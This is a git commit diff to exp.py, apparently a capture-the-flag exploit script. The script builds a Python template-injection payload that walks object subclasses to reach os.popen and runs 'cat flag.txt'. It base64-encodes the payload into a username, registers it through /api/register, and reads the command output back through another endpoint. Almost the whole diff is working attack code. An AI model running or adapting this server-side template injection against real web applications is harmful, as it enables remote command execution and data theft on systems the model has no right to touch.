358c567bb67fbd806b577f9b6abd9e732f3375e5
iceyhexman <834430486@qq.com>
2019-05-05 15:20:23 +0800

    update exp

--- exp.py
+++ exp.py
@@ -11,12 +11,13 @@ timeout = 30
 
 
 def getshell(url):
-    print("[+] Injecting payload ...")
-    payload='{{().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__["__builtins__"]["__import__"]("os").popen("echo \|`cat flag.txt`").read()}}|'+''.join(random.sample(mapa, 9))
+    payload='{{().__class__.__bases__[0].__subclasses__()[76].__init__.__globals__["__builtins__"]["__import__"]("os").popen("echo \|`cat flag.txt`").read()}}|'+''.join(random.sample(mapa, 9))
     username = str(base64.b64encode(payload.encode("utf-8")))[2:-1]
+    print("[+] Generate payload: "+username)
+    print("[+] Injecting payload ...")
     data = requests.post(url + "/api/register", json={"username": username, "password": "justforfun"}, timeout=timeout).json()
     if data["success"]:
-        print("[+] Inject payload success ...")
+        print("[+] Inject payload success !!")
         print("[+] Got token : "+data['token'])
     print("[+] Reading flag")
     flag = requests.post(url + "/api/404/getusername", json={"token": data['token']}, timeout=timeout).text.split("|")[1]
